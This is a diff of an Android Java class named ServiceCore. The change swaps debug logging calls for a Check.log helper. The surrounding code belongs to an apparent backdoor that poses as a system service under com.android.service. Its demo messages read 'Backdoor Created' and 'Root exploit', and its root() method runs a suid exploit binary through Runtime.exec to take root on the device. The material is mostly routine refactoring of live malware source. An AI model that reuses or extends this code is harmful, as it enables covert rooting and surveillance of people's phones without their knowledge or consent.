@@ -19,12 +19,12 @@ import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
 import android.graphics.Paint;
 import android.os.IBinder;
-import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
 /**
@@ -45,7 +45,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		if (Cfg.DEBUG){
-			Log.d("QZ", TAG + " (onCreate)");
+			Check.log( TAG + " (onCreate)");
 		}
 		if(Cfg.DEMO){
 			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
@@ -71,8 +71,7 @@ public class ServiceCore extends Service {
 		try {
 			wm.setBitmap(bitmap);
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Cfg.DEBUG) Check.log(e);
 		}
 	}
 
@@ -80,7 +79,7 @@ public class ServiceCore extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (onDestroy)");
+			Check.log( TAG + " (onDestroy)");
 
 		if(Cfg.DEMO)
 			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
@@ -105,7 +104,7 @@ public class ServiceCore extends Service {
 				Status.self().setRoot(root());
 			} else {
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (onStart) no media mounted");
+					Check.log( TAG + " (onStart) no media mounted");
 			}
 		}
 
@@ -119,7 +118,7 @@ public class ServiceCore extends Service {
 		try {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
+					Check.log( TAG + " (root): Exploit disabled by conf");
 
 				return false;
 			}
@@ -195,7 +194,7 @@ public class ServiceCore extends Service {
 				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
 
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG + " (onStart): Root exploit");
+					Check.log( TAG + " (onStart): Root exploit");
 				}
 				if (Cfg.DEMO) {
 					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG)
@@ -206,7 +205,7 @@ public class ServiceCore extends Service {
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
 			} else {
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG + " (onStart): exploit failed!");
+					Check.log( TAG + " (onStart): exploit failed!");
 				}
 				if (Cfg.DEMO) {
 					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG)
@@ -217,8 +216,8 @@ public class ServiceCore extends Service {
 		} catch (Exception e1) {
 
 			if (Cfg.DEBUG) {
-				e1.printStackTrace();
-				Log.d("QZ", TAG + " (root): Exception on root()");
+				Check.log(e1);
+				Check.log( TAG + " (root): Exception on root()");
 			}
 			return false;
 		}
@@ -264,13 +263,13 @@ public class ServiceCore extends Service {
 
 				while ((line = stdout.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stdout): " + line);
+						Check.log( TAG + " (stdout): " + line);
 					}
 				}
 
 				while ((line = stderr.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stderr): " + line);
+						Check.log( TAG + " (stderr): " + line);
 					}
 				}
 
@@ -278,14 +277,14 @@ public class ServiceCore extends Service {
 					localProcess.waitFor();
 				} catch (InterruptedException e) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (waitFor): " + e);
-						e.printStackTrace();
+						Check.log( TAG + " (waitFor): " + e);
+						Check.log(e);
 					}
 				}
 
 				int exitValue = localProcess.exitValue();
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);
+					Check.log( TAG + " (waitFor): exitValue " + exitValue);
 
 				stdin.close();
 				stdout.close();
@@ -294,9 +293,9 @@ public class ServiceCore extends Service {
 			} catch (IOException e) {
 				localProcess = null;
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG
+					Check.log( TAG
 							+ " (ExploitRunnable): Exception on run(): " + e);
-					e.printStackTrace();
+					Check.log(e);
 				}
 			}
 		}
